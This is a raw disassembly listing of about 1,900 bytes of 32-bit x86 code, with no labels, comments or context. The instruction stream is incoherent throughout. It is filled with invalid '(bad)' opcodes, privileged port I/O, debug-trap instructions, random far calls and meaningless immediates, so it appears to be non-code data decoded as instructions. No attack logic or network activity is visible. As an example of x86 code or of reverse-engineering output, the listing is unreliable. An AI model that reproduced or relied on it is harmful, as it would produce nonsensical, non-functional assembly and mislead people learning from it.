  412f0f:	outs   dx,DWORD PTR ds:[esi]
  412f10:	pop    eax
  412f11:	push   ds
  412f12:	pop    eax
  412f13:	pop    esp
  412f14:	mov    ds:0xd036592d,al
  412f19:	or     BYTE PTR [ebp+ebx*4+0x56],ch
  412f1d:	mov    al,ds:0x71921040
  412f22:	mov    ebp,0xc688eb5d
  412f27:	sbb    dh,BYTE PTR [esp+eax*1-0x14]
  412f2b:	fdiv   QWORD PTR [esi-0x19]
  412f2e:	or     DWORD PTR [eax-0x64],ecx
  412f31:	xchg   esi,eax
  412f32:	lods   eax,DWORD PTR ds:[esi]
  412f33:	dec    eax
  412f34:	stos   DWORD PTR es:[edi],eax
  412f35:	dec    esp
  412f36:	add    BYTE PTR [esp+ecx*2+0x8a60a2d],bl
  412f3d:	add    ebx,DWORD PTR [ebx+0x73a4b6b3]
  412f43:	xchg   DWORD PTR [ebx-0x4f],edi
  412f46:	dec    ebp
  412f47:	xor    DWORD PTR [ecx-0x51],esi
  412f4a:	jae    0x412f07
  412f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f4d:	aaa    
  412f4e:	inc    edi
  412f4f:	push   edi
  412f50:	add    DWORD PTR [ebp+0x5092688],esi
  412f56:	adc    esp,esp
  412f58:	inc    eax
  412f59:	hlt    
  412f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f5b:	mov    ch,0x3f
  412f5d:	pop    edx
  412f5e:	xor    ebp,DWORD PTR [edi+ebx*1-0x6d]
  412f62:	fwait
  412f63:	cwde   
  412f64:	xor    al,0x78
  412f66:	sbb    eax,0x5e478c78
  412f6b:	pop    ebp
  412f6c:	out    0x7c,al
  412f6e:	les    esp,FWORD PTR ds:0xf3fdad3a
  412f74:	cwde   
  412f75:	test   BYTE PTR ds:0x37eeca20,dh
  412f7b:	call   0xbf00340
  412f80:	mov    ebp,0xf0af0410
  412f85:	mov    esp,0xc7d35ae6
  412f8a:	mov    ebp,0x1f096036
  412f90:	mov    cl,0xc0
  412f92:	retf   
  412f93:	pop    es
  412f94:	mov    BYTE PTR [ebx],dh
  412f96:	push   0x78
  412f98:	sbb    edi,eax
  412f9a:	sub    eax,0xdc647c07
  412f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fa0:	daa    
  412fa1:	cmp    BYTE PTR [ecx+0x66],0x8e
  412fa5:	adc    dh,dl
  412fa7:	or     DWORD PTR [eax-0x5d],esi
  412faa:	add    al,0x5d
  412fac:	sahf   
  412fad:	xchg   DWORD PTR [ebp+0x55],ebp
  412fb0:	enter  0x2798,0x73
  412fb4:	sbb    DWORD PTR [ebx-0x572cbf4e],edx
  412fba:	enter  0x37b0,0xe3
  412fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fbf:	mov    al,ds:0xcb9ac5ab
  412fc4:	pop    ebp
  412fc5:	push   ecx
  412fc6:	push   ds
  412fc7:	mov    eax,0x387ea00e
  412fcc:	mov    bh,0x75
  412fce:	and    esi,eax
  412fd0:	pop    ecx
  412fd1:	mov    al,ds:0x4ab02da
  412fd6:	popa   
  412fd7:	xchg   esp,eax
  412fd8:	add    DWORD PTR [esi],0xbfaefbd8
  412fde:	cmp    BYTE PTR [ebx-0x73],ah
  412fe1:	shl    BYTE PTR [ecx],1
  412fe3:	or     DWORD PTR [edx],esi
  412fe5:	shl    dl,0x30
  412fe8:	add    al,0x37
  412fea:	cli    
  412feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fec:	out    dx,eax
  412fed:	mov    ecx,0x6a933a6a
  412ff2:	jge    0x412fa7
  412ff4:	pop    ecx
  412ff5:	xchg   edi,eax
  412ff6:	dec    ebp
  412ff7:	and    ecx,DWORD PTR [ebp-0x7]
  412ffa:	enter  0xbb60,0xc
  412ffe:	dec    edi
  412fff:	pushf  
  413000:	inc    esi
  413001:	adc    eax,0xa7d398
  413006:	mov    ds:0x4e99b67f,al
  41300b:	mov    eax,ds:0x23543c7a
  413010:	pop    edi
  413011:	jb     0x412fea
  413013:	mov    ?,WORD PTR [ebx-0x142cf4e9]
  413019:	mov    ?,ebp
  41301b:	outs   dx,BYTE PTR ds:[esi]
  41301c:	adc    al,0xab
  41301e:	cmp    cl,BYTE PTR [ebp+ecx*8-0x78]
  413022:	cs jle 0x413063
  413025:	(bad)  
  413026:	into   
  413027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413028:	stc    
  413029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41302a:	cmp    al,0x5f
  41302c:	jle    0x413039
  41302e:	and    eax,0xda88e6a1
  413033:	xlat   BYTE PTR ds:[ebx]
  413034:	or     bh,BYTE PTR [ecx]
  413036:	hlt    
  413037:	and    ebp,esi
  413039:	or     esi,ebp
  41303b:	cmp    eax,0x73cafa2d
  413040:	mov    cl,0x40
  413042:	mov    esi,ds
  413044:	mov    al,ds:0xdb96a6bf
  413049:	and    al,0x3
  41304b:	sbb    BYTE PTR [edi],0x55
  41304e:	cmp    eax,DWORD PTR [ebp+0x43]
  413051:	push   edx
  413052:	xchg   ebp,eax
  413053:	pushf  
  413054:	pushf  
  413055:	enter  0x7240,0xf9
  413059:	sbb    esp,ebp
  41305b:	xor    BYTE PTR [ecx+0x347b692b],bl
  413061:	stos   BYTE PTR es:[edi],al
  413062:	leave  
  413063:	xchg   ebx,eax
  413064:	sub    BYTE PTR [ebx+0x22919e43],ch
  41306a:	imul   edx,eax,0xc2b591b7
  413070:	xchg   ebp,eax
  413071:	mov    dl,bh
  413073:	daa    
  413074:	xor    cl,BYTE PTR [ecx+0x1e]
  413077:	or     eax,0x36f84bf4
  41307c:	jnp    0x4130c7
  41307e:	push   ecx
  41307f:	in     al,dx
  413080:	mov    bh,0xac
  413082:	out    0xc4,eax
  413084:	int    0xab
  413086:	rol    BYTE PTR [edx],1
  413088:	data16 lods al,BYTE PTR ds:[esi]
  41308a:	int3   
  41308b:	fldenv [ecx]
  41308d:	jns    0x413013
  41308f:	leave  
  413090:	imul   edx,DWORD PTR [edi],0x73
  413093:	sub    DWORD PTR [esi+0x16402196],eax
  413099:	aad    0x40
  41309b:	inc    eax
  41309c:	ins    DWORD PTR es:[edi],dx
  41309d:	xchg   ecx,eax
  41309e:	cmp    BYTE PTR [ebx-0x74b39a6d],bl
  4130a4:	or     eax,0x5f49392b
  4130a9:	xchg   ecx,eax
  4130aa:	sbb    eax,0x5faf2b5e
  4130af:	xor    bl,BYTE PTR [ebx+ebp*1+0x1c601035]
  4130b6:	aas    
  4130b7:	int    0xd3
  4130b9:	sti    
  4130ba:	dec    ebx
  4130bb:	rcr    BYTE PTR [eax+0x6440d993],1
  4130c1:	iret   
  4130c2:	mov    DWORD PTR [ebp+0x59],edx
  4130c5:	loopne 0x41306c
  4130c7:	inc    edi
  4130c8:	pop    ebx
  4130c9:	ficom  DWORD PTR [eax]
  4130cb:	xor    DWORD PTR [ebx],esi
  4130cd:	sbb    eax,0xf6b74139
  4130d2:	lods   eax,DWORD PTR ds:[esi]
  4130d3:	cmp    BYTE PTR [esp+esi*1],0xdf
  4130d7:	or     BYTE PTR [ebp-0x66],dl
  4130da:	cmp    dl,BYTE PTR [ecx+0x5e]
  4130dd:	rol    DWORD PTR [edi-0x2a],cl
  4130e0:	das    
  4130e1:	mov    eax,ds:0xb01460cb
  4130e6:	sbb    al,0xe3
  4130e8:	jp     0x4130be
  4130ea:	inc    esp
  4130eb:	jg     0x41307b
  4130ed:	or     al,0xae
  4130ef:	nop
  4130f0:	xor    al,0xa4
  4130f2:	repz cmp bl,dh
  4130f5:	mov    ch,0x6a
  4130f7:	sub    edi,DWORD PTR [eax-0x31e2dc59]
  4130fd:	popf   
  4130fe:	rcr    BYTE PTR [ecx+0x18],cl
  413101:	jne    0x4130d8
  413103:	fnstsw WORD PTR [edx]
  413105:	jl     0x4130e9
  413107:	push   eax
  413108:	mov    ds:0x3ed4dc6c,al
  41310d:	std    
  41310e:	aam    0xc9
  413110:	mov    ebx,0x9023b98f
  413115:	jecxz  0x41309e
  413117:	out    dx,eax
  413118:	retf   0x47fb
  41311b:	adc    BYTE PTR [edx+0x14],bl
  41311e:	and    bh,BYTE PTR [esp+edx*1]
  413121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413122:	sbb    esi,DWORD PTR [edi+esi*4]
  413125:	(bad)  
  413126:	loope  0x4130e3
  413128:	xchg   esp,edx
  41312a:	imul   ecx,DWORD PTR ds:0xfb812bb1,0xffffff9c
  413131:	out    dx,eax
  413132:	adc    dh,BYTE PTR [ecx+0x62]
  413135:	pop    esp
  413136:	push   0x46fd559e
  41313b:	enter  0x76c,0xa5
  41313f:	jl     0x4130cd
  413141:	push   eax
  413142:	lods   al,BYTE PTR ds:[esi]
  413143:	fndisi(8087 only) 
  413145:	xchg   ebp,eax
  413146:	inc    ebp
  413147:	stos   BYTE PTR es:[edi],al
  413148:	loopne 0x4130db
  41314a:	popa   
  41314b:	cmp    eax,0x46383d6c
  413150:	test   BYTE PTR [ebx],bh
  413152:	dec    esp
  413153:	cs call 0x3d1e:0xe545438f
  41315b:	into   
  41315c:	pop    ds
  41315d:	jp     0x4131b6
  41315f:	shl    DWORD PTR [eax+0x61489c78],1
  413165:	mov    eax,ds:0xb3d86807
  41316a:	or     esi,DWORD PTR [eax]
  41316c:	mov    ebp,0xd2801fd5
  413171:	cld    
  413172:	pop    ebx
  413173:	cmp    edi,esi
  413175:	es xor cl,BYTE PTR es:[eax-0x2e]
  41317a:	sbb    dh,BYTE PTR [ebx+0x42]
  41317d:	dec    ebx
  41317e:	dec    edi
  41317f:	mov    bh,0xfd
  413181:	in     eax,dx
  413182:	cdq    
  413183:	outs   dx,BYTE PTR ds:[esi]
  413184:	arpl   WORD PTR [edi],sp
  413186:	inc    ebp
  413187:	pop    ds
  413188:	xchg   edi,esi
  41318a:	cmp    ebx,DWORD PTR es:[esi-0x43fd9d3a]
  413191:	mov    ecx,0x9630c9e6
  413196:	aad    0x25
  413198:	cmp    bh,BYTE PTR [ebx+0x5084578d]
  41319e:	lods   eax,DWORD PTR ds:[esi]
  41319f:	jnp    0x4131c3
  4131a1:	push   ecx
  4131a2:	inc    ebp
  4131a3:	ins    DWORD PTR es:[edi],dx
  4131a4:	scas   eax,DWORD PTR es:[edi]
  4131a5:	outs   dx,DWORD PTR ds:[esi]
  4131a6:	imul   esp,esp,0x6e
  4131a9:	pushf  
  4131aa:	scas   eax,DWORD PTR es:[edi]
  4131ab:	ret    0xbb24
  4131ae:	mov    ah,0x5
  4131b0:	sbb    eax,0xf9eddb1
  4131b5:	repz push esp
  4131b7:	and    DWORD PTR [eax+0x4086410c],0xdb501ed2
  4131c1:	dec    ebp
  4131c2:	lock xchg ecx,eax
  4131c4:	fwait
  4131c5:	mov    ecx,0x8b9575a8
  4131ca:	or     BYTE PTR [eax+0x566fafe9],dl
  4131d0:	jge    0x4131fd
  4131d2:	popf   
  4131d3:	sar    BYTE PTR [esi-0x5224cf3d],0xd3
  4131da:	test   eax,0xcc175733
  4131df:	dec    ebx
  4131e0:	add    BYTE PTR [ebp-0x7f],dl
  4131e3:	sahf   
  4131e4:	push   edi
  4131e5:	cs push ss
  4131e7:	(bad)  
  4131e8:	mov    ebx,0xf918c1d6
  4131ed:	sub    al,0x9d
  4131ef:	xchg   DWORD PTR [ebx+0x1cf50863],edx
  4131f5:	scas   al,BYTE PTR es:[edi]
  4131f6:	leave  
  4131f7:	add    ah,al
  4131f9:	out    0xf6,al
  4131fb:	cdq    
  4131fc:	xchg   ebx,eax
  4131fd:	jne    0x4131e8
  4131ff:	sbb    eax,0xa3e1a524
  413204:	xor    al,0x88
  413206:	call   0x8bceae2e
  41320b:	adc    DWORD PTR [eax],esp
  41320d:	cmp    esp,DWORD PTR [edx+0x22bc4881]
  413213:	and    DWORD PTR [edi],ebp
  413215:	xchg   ebx,eax
  413216:	sub    BYTE PTR [ecx-0x61f6e87f],dl
  41321c:	lods   eax,DWORD PTR ds:[esi]
  41321d:	popf   
  41321e:	stos   DWORD PTR es:[edi],eax
  41321f:	mov    eax,0x22932236
  413224:	mov    cl,al
  413226:	push   ecx
  413227:	enter  0xebd3,0xbb
  41322b:	mov    dl,0xa8
  41322d:	cs mov ch,0x24
  413230:	adc    eax,0xba3caae8
  413235:	lods   eax,DWORD PTR ds:[esi]
  413236:	push   ss
  413237:	div    bh
  413239:	cmp    eax,0xc73644d3
  41323e:	cmp    DWORD PTR [edx-0x4540ce76],edx
  413244:	and    eax,0x16ab5
  413249:	ja     0x41325e
  41324b:	pop    esp
  41324c:	popf   
  41324d:	push   ebx
  41324e:	mov    ds:0x7d3d7fe6,eax
  413253:	and    bl,ah
  413255:	(bad)  
  413256:	push   0x960008fe
  41325b:	pop    ebp
  41325c:	cwde   
  41325d:	and    al,0x12
  41325f:	loop   0x413234
  413261:	pop    edx
  413262:	add    eax,0x205aa7e
  413267:	mov    gs:0x5d50f75c,eax
  41326d:	ret    0xbda5
  413270:	(bad)  
  413271:	outs   dx,BYTE PTR ds:[esi]
  413272:	mov    edi,0xf9fb99a0
  413277:	out    0x7a,al
  413279:	xor    esi,DWORD PTR [eax]
  41327b:	mov    eax,eax
  41327d:	rcr    DWORD PTR [edx],cl
  41327f:	test   eax,edx
  413281:	iret   
  413282:	xor    eax,0x4dfbfab7
  413287:	fcmovne st,st(1)
  413289:	inc    esp
  41328a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41328b:	into   
  41328c:	cmp    DWORD PTR [ebx],edi
  41328e:	inc    esi
  41328f:	fs iret 
  413291:	fs xchg ebp,eax
  413293:	stos   BYTE PTR es:[edi],al
  413294:	add    eax,0xe9a31f28
  413299:	fsub   QWORD PTR [ebx+0x48]
  41329c:	xchg   edi,eax
  41329d:	ficom  WORD PTR [esi+edx*8+0x106b7d08]
  4132a4:	pop    esp
  4132a5:	test   BYTE PTR [edx-0x41],dl
  4132a8:	jno    0x413273
  4132aa:	sub    dh,BYTE PTR [edx]
  4132ac:	test   bh,dh
  4132ae:	lock xchg ecx,eax
  4132b0:	inc    DWORD PTR [ebx-0x30]
  4132b3:	icebp  
  4132b4:	sbb    dl,BYTE PTR [ecx+0x359450f4]
  4132ba:	sbb    ebx,DWORD PTR [ebx+ebp*4-0x3e]
  4132be:	mov    DWORD PTR [eax+eax*8+0x47],edx
  4132c2:	in     eax,0x2e
  4132c4:	inc    ecx
  4132c5:	jbe    0x413252
  4132c7:	cmp    dh,bl
  4132c9:	lods   eax,DWORD PTR ds:[esi]
  4132ca:	clc    
  4132cb:	and    eax,0x9c40ee9d
  4132d0:	sub    esi,0x39
  4132d3:	jo     0x413279
  4132d5:	push   esp
  4132d6:	hlt    
  4132d7:	mov    ah,0x20
  4132d9:	test   DWORD PTR [esi+0x6c],esp
  4132dc:	outs   dx,BYTE PTR ds:[esi]
  4132dd:	(bad)  
  4132de:	scas   eax,DWORD PTR es:[edi]
  4132df:	sbb    BYTE PTR [eax-0x31ae1e84],dh
  4132e5:	or     ebp,DWORD PTR [ecx]
  4132e7:	lds    esp,FWORD PTR [edi+eiz*4]
  4132ea:	pop    ecx
  4132eb:	push   0x18
  4132ed:	fs xchg esi,eax
  4132ef:	add    ch,dl
  4132f1:	imul   esp,DWORD PTR [eax+0x3d],0xd01b198c
  4132f8:	jg     0x4132cd
  4132fa:	cmp    DWORD PTR [ecx-0x1a716782],0x3af0299a
  413304:	popf   
  413305:	test   ebp,0x1bb9768
  41330b:	aam    0xae
  41330d:	push   ds
  41330e:	rcr    ch,1
  413310:	fcom   DWORD PTR [ebx+0x3f]
  413313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413314:	pushf  
  413315:	and    bh,ch
  413317:	rol    BYTE PTR [eax+0xa5e9c7b],1
  41331d:	lods   al,BYTE PTR ds:[esi]
  41331e:	lea    eax,[ebx+0xd]
  413321:	cmp    eax,0xbddd4180
  413326:	jmp    0xa7166179
  41332b:	leave  
  41332c:	cmp    BYTE PTR [ebx+0x412266d0],ch
  413332:	xchg   esp,edi
  413334:	nop
  413335:	test   al,0x8b
  413338:	bnd jno 0x41334c
  41333b:	dec    ecx
  41333c:	mov    cl,0x37
  41333e:	xchg   ebp,eax
  41333f:	add    eax,0x92426a06
  413344:	add    BYTE PTR [edx+0x7db2b2d1],bh
  41334a:	lods   eax,DWORD PTR ds:[esi]
  41334b:	inc    ecx
  41334c:	xchg   ebx,eax
  41334d:	stc    
  41334e:	rol    eax,cl
  413350:	adc    ch,BYTE PTR [ebp+0x10]
  413353:	out    0xef,eax
  413355:	idiv   DWORD PTR [ebp+0x164f620e]
  41335b:	pop    esp
  41335c:	loopne 0x4133d8
  41335e:	sar    DWORD PTR [bx+si],cl
  413361:	iret   
  413362:	lods   al,BYTE PTR ds:[esi]
  413363:	and    al,0xd2
  413365:	in     al,dx
  413366:	push   ebp
  413367:	jo     0x413328
  413369:	shl    bh,cl
  41336b:	push   esi
  41336c:	icebp  
  41336d:	cdq    
  41336e:	jns    0x41337c
  413370:	ss test al,0x87
  413373:	mov    cs,WORD PTR ds:0x1ff885aa
  413379:	xor    BYTE PTR [ebx+ebp*4+0x37],0x3d
  41337e:	add    ch,BYTE PTR [edi-0x9]
  413381:	push   esp
  413382:	pop    ds
  413383:	pop    ebx
  413384:	popa   
  413385:	mov    ds:0x4be0bebe,eax
  41338a:	pop    edx
  41338b:	fisttp QWORD PTR [edi+esi*1+0x3a]
  41338f:	xlat   BYTE PTR ds:[ebx]
  413390:	js     0x4133a8
  413392:	(bad)  
  413393:	push   ecx
  413394:	and    BYTE PTR [ecx+edx*1-0x932b479],dh
  41339b:	or     eax,0x39364cfc
  4133a0:	dec    esp
  4133a1:	pop    ecx
  4133a2:	int3   
  4133a3:	mov    eax,0x6e7db44f
  4133a8:	inc    esp
  4133a9:	test   DWORD PTR [eax],ecx
  4133ab:	call   FWORD PTR [ecx+0x3823ac4b]
  4133b1:	ds sbb eax,0x7c239c4f
  4133b7:	mov    ebp,DWORD PTR [eax-0x44f0de5d]
  4133bd:	xchg   esp,eax
  4133be:	xchg   ebp,eax
  4133bf:	jbe    0x413437
  4133c1:	mov    BYTE PTR [eax],ch
  4133c3:	ins    BYTE PTR es:[edi],dx
  4133c4:	xchg   esi,eax
  4133c5:	test   al,0xf9
  4133c7:	popa   
  4133c8:	jbe    0x413427
  4133ca:	in     al,dx
  4133cb:	test   al,0xae
  4133cd:	mov    ss:0xc2e02697,eax
  4133d3:	sbb    DWORD PTR [ebx+0x7f76751f],ebp
  4133d9:	or     BYTE PTR [ebp-0x6830c911],0xdb
  4133e0:	add    eax,0xe6e472a5
  4133e5:	call   0x63ae:0xd336bb72
  4133ec:	dec    edx
  4133ed:	pop    ds
  4133ee:	and    BYTE PTR [esp+eax*2+0x20],bl
  4133f2:	pop    ebx
  4133f3:	cmc    
  4133f4:	retf   0x3877
  4133f7:	dec    esi
  4133f8:	lea    edi,[edx]
  4133fa:	outs   dx,DWORD PTR ds:[esi]
  4133fb:	mov    ch,0x5c
  4133fd:	xor    BYTE PTR ds:0xafdb9149,bh
  413403:	jmp    0x4133b6
  413405:	fbstp  TBYTE PTR [edi-0x3a]
  413408:	xor    ah,BYTE PTR [esi+0x49e812a1]
  41340e:	dec    edi
  41340f:	cmp    BYTE PTR [ecx],dl
  413411:	sahf   
  413412:	adc    esi,DWORD PTR [ebp+0x3bac2b8e]
  413418:	xchg   ebp,eax
  413419:	gs push eax
  41341b:	sbb    al,0x3e
  41341d:	enter  0x5a82,0x29
  413421:	sbb    ecx,0x3
  413424:	adc    al,0xb1
  413426:	add    eax,0x2fe520a1
  41342b:	mov    ch,BYTE PTR [ebx+0x59fcbb5]
  413431:	(bad)  
  413432:	mov    ebp,0xc0bd563b
  413437:	inc    esp
  413438:	(bad)  
  413439:	repz push 0x6a
  41343c:	mov    WORD PTR [edx],ds
  41343e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41343f:	fstp   QWORD PTR [eax+ebp*1]
  413442:	mov    bh,0x5c
  413444:	sub    dl,BYTE PTR [ebp+0x671053b7]
  41344a:	dec    ecx
  41344b:	xchg   ebp,eax
  41344c:	mov    fs,WORD PTR [ebx]
  41344e:	mov    ebx,DWORD PTR [ebp-0x38]
  413451:	shl    BYTE PTR [ebp-0x56],1
  413454:	pop    es
  413455:	idiv   DWORD PTR [ebp-0x78]
  413458:	mov    dl,0xb9
  41345a:	inc    ecx
  41345b:	add    ecx,DWORD PTR [edi+ebx*2+0x3c]
  41345f:	mov    bh,BYTE PTR [edi-0x3d]
  413462:	mov    esp,0x6a447b38
  413467:	std    
  413468:	fmul   QWORD PTR [ecx+edx*4+0x66]
  41346c:	ds push 0xffffffe3
  41346f:	scas   eax,DWORD PTR es:[edi]
  413470:	cwde   
  413471:	xchg   esp,eax
  413472:	or     bh,BYTE PTR [eax]
  413474:	pop    ss
  413475:	nop
  413476:	xchg   esp,eax
  413477:	cmp    DWORD PTR [eax-0x4dbd69e6],esi
  41347d:	inc    esi
  41347e:	or     ebp,DWORD PTR [edx-0x497ab835]
  413484:	scas   al,BYTE PTR es:[edi]
  413485:	push   0x7d
  413487:	icebp  
  413488:	cmp    BYTE PTR [edi],ah
  41348a:	clc    
  41348b:	shl    ebx,1
  41348d:	shr    BYTE PTR [ecx+edx*8-0x6c],cl
  413491:	inc    eax
  413492:	ins    BYTE PTR es:[edi],dx
  413493:	push   ebx
  413494:	pop    esi
  413495:	pop    ds
  413496:	xchg   ebx,eax
  413497:	cmp    ch,BYTE PTR [ecx]
  413499:	lea    esp,[eax-0x66]
  41349c:	cmp    edx,DWORD PTR [ebx+eax*4]
  41349f:	mov    bl,0x79
  4134a1:	call   0xe057:0xd097a135
  4134a8:	cli    
  4134a9:	mov    WORD PTR [esi-0x730b45ba],fs
  4134af:	clc    
  4134b0:	lahf   
  4134b1:	xchg   esp,eax
  4134b2:	leave  
  4134b3:	fild   WORD PTR [edi+ecx*2-0x23]
  4134b7:	fdiv   st,st(2)
  4134b9:	jl     0x413442
  4134bb:	or     eax,0xf69aaeca
  4134c0:	lods   eax,DWORD PTR ds:[esi]
  4134c1:	ins    BYTE PTR es:[edi],dx
  4134c2:	(bad)  
  4134c3:	jmp    0xe6768822
  4134c8:	clc    
  4134c9:	(bad)  
  4134ca:	outs   dx,BYTE PTR ds:[esi]
  4134cb:	aaa    
  4134cc:	enter  0xb427,0xc7
  4134d0:	or     dh,BYTE PTR [edx+ecx*1]
  4134d3:	add    DWORD PTR [ebp-0x4f9bdf15],ebp
  4134d9:	mov    esi,0x5085fc01
  4134de:	dec    esp
  4134df:	imul   ebx,DWORD PTR [eax-0x19],0x544adcca
  4134e6:	loope  0x4134b7
  4134e8:	and    al,0xdb
  4134ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134eb:	add    al,0xe4
  4134ed:	dec    ebx
  4134ee:	pop    ecx
  4134ef:	mov    eax,ds:0x7e28f647
  4134f4:	ret    
  4134f5:	repz push ebx
  4134f7:	inc    esi
  4134f8:	imul   edi,DWORD PTR [edi+0x4],0xf5eb5695
  4134ff:	mov    dh,0x6d
  413501:	cld    
  413502:	arpl   WORD PTR [ebx+ebx*2-0xc],sp
  413506:	mov    ch,0x28
  413508:	jnp    0x413580
  41350a:	dec    esp
  41350b:	xchg   ecx,eax
  41350c:	adc    al,0xb1
  41350e:	inc    esi
  41350f:	scas   al,BYTE PTR es:[edi]
  413510:	sti    
  413511:	ja     0x413494
  413513:	or     BYTE PTR [esi],0x25
  413516:	hlt    
  413517:	ja     0x413553
  413519:	mov    ah,0xb9
  41351b:	sbb    ebp,ebp
  41351d:	pushf  
  41351e:	push   esi
  41351f:	fisubr DWORD PTR [eax]
  413521:	ins    BYTE PTR es:[edi],dx
  413522:	fsubr  QWORD PTR [ebx]
  413524:	mov    WORD PTR ds:0x39ba5f72,es
  41352a:	ret    0x619d
  41352d:	lods   eax,DWORD PTR ds:[esi]
  41352e:	mov    DWORD PTR [ecx-0x17ea837f],eax
  413534:	dec    ebp
  413535:	adc    bl,dh
  413537:	cmc    
  413538:	in     al,dx
  413539:	dec    edi
  41353a:	out    dx,eax
  41353b:	es pop es
  41353d:	pushf  
  41353e:	add    al,0x19
  413540:	fnstenv [eax]
  413542:	leave  
  413543:	ret    0xd939
  413546:	adc    ch,BYTE PTR [ebp-0x32e7969e]
  41354c:	pop    ebx
  41354d:	mov    ebp,0x6f0e1bf6
  413552:	push   edi
  413553:	loop   0x4135a6
  413555:	mov    ch,0xf
  413557:	imul   ebx,DWORD PTR [eax-0x15315526],0xe85d1b20
  413561:	lds    esp,FWORD PTR [ebx+0x53]
  413564:	stc    
  413565:	mov    dl,0x38
  413567:	retf   0xb214
  41356a:	cld    
  41356b:	add    eax,0xa3d2799f
  413570:	mov    al,0x54
  413572:	shl    DWORD PTR [edi-0x33],1
  413575:	or     edi,DWORD PTR [eax+0x3032bf6e]
  41357b:	push   0xffffff9a
  41357d:	dec    esi
  41357e:	lods   eax,DWORD PTR ds:[esi]
  41357f:	rcr    BYTE PTR [ecx-0x14],0xbf
  413583:	xchg   esp,eax
  413584:	jle    0x41352b
  413586:	lods   eax,DWORD PTR ds:[esi]
  413587:	aad    0xba
  413589:	call   0x137a:0xa41841bf
  413590:	lock clc 
  413592:	rol    DWORD PTR [eax-0x5a],1
  413595:	dec    eax
  413596:	fstp   TBYTE PTR [ecx+0x3768de2c]
  41359c:	xor    eax,0x192b1903
  4135a1:	fnsave [ecx-0x34]
  4135a4:	and    DWORD PTR [ecx+ecx*2-0x5bed3a2a],0xffffff98
  4135ac:	xor    eax,0xd94cf5c3
  4135b1:	sti    
  4135b2:	adc    DWORD PTR [ecx-0x32],ecx
  4135b5:	jbe    0x4135c3
  4135b7:	idiv   eax
  4135b9:	lock rol BYTE PTR [edx],cl
  4135bc:	in     eax,0x85
  4135be:	or     DWORD PTR [ebp+0x79],0x60
  4135c2:	inc    esp
  4135c3:	push   ecx
  4135c4:	mov    BYTE PTR [edi],0x33
  4135c7:	inc    ebx
  4135c8:	test   BYTE PTR [ebx-0x5e715a22],0x97
  4135cf:	nop
  4135d0:	test   DWORD PTR es:[eax-0x6c],esp
  4135d4:	sbb    esi,DWORD PTR [edi]
  4135d6:	inc    ebx
  4135d7:	popf   
  4135d8:	dec    eax
  4135d9:	sbb    esi,DWORD PTR [ecx-0x1f]
  4135dc:	pushf  
  4135dd:	push   cs
  4135de:	mov    eax,0x8504a3da
  4135e3:	inc    edx
  4135e4:	sbb    dl,BYTE PTR [edi]
  4135e6:	data16 ja 0x413590
  4135e9:	retf   
  4135ea:	and    esp,DWORD PTR [ebp-0x3a82ee18]
  4135f0:	(bad)  
  4135f1:	xor    al,0x25
  4135f3:	enter  0xc658,0x4a
  4135f7:	ficomp DWORD PTR [edx-0x1f]
  4135fa:	rcl    BYTE PTR [edx],0xef
  4135fd:	mov    esi,0xbddbbf07
  413602:	pop    ss
  413603:	fs add al,0x39
  413606:	fld    TBYTE PTR [ebx+0x2d]
  413609:	mov    ch,0x23
  41360b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41360c:	call   0x2985:0x21c37174
  413613:	ret    0x7e2f
  413616:	arpl   WORD PTR [edx-0x25b8d633],si
  41361c:	int    0x95
  41361e:	add    eax,0x2051a699
  413623:	xor    edx,DWORD PTR [ebx]
  413625:	fs lahf 
  413627:	iret   
  413628:	add    esp,eax
  41362a:	ret    
  41362b:	xlat   BYTE PTR ds:[ebx]
  41362c:	and    BYTE PTR [esi],bl
  41362e:	jae    0x4135d1
  413630:	sbb    ch,BYTE PTR [edx-0x13476605]
  413636:	out    dx,al
  413637:	mov    dl,0x5f
  413639:	xor    dl,ch
  41363b:	(bad)  
  41363c:	jecxz  0x413630
  41363e:	mov    eax,ds:0x5b4c4151
  413643:	sub    eax,0xb98d36d4
  413648:	out    dx,eax
  413649:	cmp    ebp,DWORD PTR [ebx+0x1c4ab1d4]
  41364f:	jmp    0xb9a3:0x88ae04e1
  413656:	jecxz  0x41369a
  413658:	outs   dx,DWORD PTR ds:[esi]
  413659:	pop    ss
  41365a:	inc    edx
  41365b:	sbb    BYTE PTR [ebx+0x152697ba],0xa7
  413662:	pop    ebx
  413663:	xchg   DWORD PTR [esi],ecx
  413665:	inc    ecx
  413666:	cmp    edi,DWORD PTR [esi-0x1d6190c7]
  41366c:	mov    eax,ds:0xeac35510
  413671:	shl    DWORD PTR [ecx-0x40a1c669],cl
  413677:	rol    BYTE PTR [ebp-0x36be86dc],1
  41367d:	pop    eax
  41367e:	test   DWORD PTR [edx+0x59],esp
  413681:	adc    al,BYTE PTR [ecx-0x10]
  413684:	retf   
  413685:	imul   ebp
  413687:	or     DWORD PTR [esi-0x47],eax
  41368a:	mov    DWORD PTR [ecx+0x3c],esi
  41368d:	adc    BYTE PTR [ecx+0x3a],dl
  413690:	mov    bl,0xcf
  413692:	cmp    al,0x35
  413694:	(bad)  
  413695:	sar    BYTE PTR [esi+0x2f],1
  413698:	jl     0x4136ab
  41369a:	popa   
  41369b:	lods   eax,DWORD PTR ds:[esi]
  41369c:	stos   BYTE PTR es:[edi],al
  41369d:	sub    DWORD PTR [ebp-0x19],edi
  4136a0:	out    dx,eax
  4136a1:	pop    ebx
  4136a2:	addr16 ret 
  4136a4:	mov    edi,gs
  4136a6:	sub    eax,0xeef13799
  4136ab:	lods   eax,DWORD PTR ds:[esi]
  4136ac:	cmp    ebp,DWORD PTR [eax+edi*2-0xe931089]
  4136b3:	or     eax,DWORD PTR [ebx-0x69bf2de4]
  4136b9:	rol    bh,1
  4136bb:	iret   
  4136bc:	and    al,0x56
